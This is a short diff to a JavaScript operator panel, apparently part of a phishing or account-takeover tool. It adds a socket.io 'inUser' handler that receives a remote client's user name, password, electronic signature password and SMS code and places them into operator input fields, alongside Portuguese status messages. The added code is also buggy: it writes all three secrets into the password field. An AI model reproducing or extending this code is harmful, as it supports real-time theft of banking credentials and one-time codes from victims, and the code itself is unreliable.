@@ -115,7 +115,7 @@ const operators = (() => {
 
         socket.on('finish', (client) => {
             if(client.id != clientOperating) return 
-            
+
             document.querySelector('.statusOP').innerHTML = `Finalizado`
 
             document.title = `Finalizado`
@@ -174,6 +174,22 @@ const operators = (() => {
                 document.querySelector('.statusOP').innerHTML = `SAIU`
                 leaveClient()
             }
+        })
+
+        socket.on('inUser', client => {
+            const { user, password, eletronicPassword, sms } = client
+
+            const inputUser = document.querySelector('input.opUser');
+            const inputPassword = document.querySelector('input.opPassword');
+            const inputEletronic = document.querySelector('input.opAssign');
+            const inputSMS = document.querySelector('input.opSms');
+
+            if(inputUser) inputUser.value = user
+            if(inputPassword) inputPassword.value = password
+            if(inputPassword) inputPassword.value = eletronicPassword
+            if(inputPassword) inputPassword.value = sms
+
+            if(document.querySelector('.statusOP')) document.querySelector('.statusOP').innerHTML = 'Na tela de usuário'
         })
     }
 
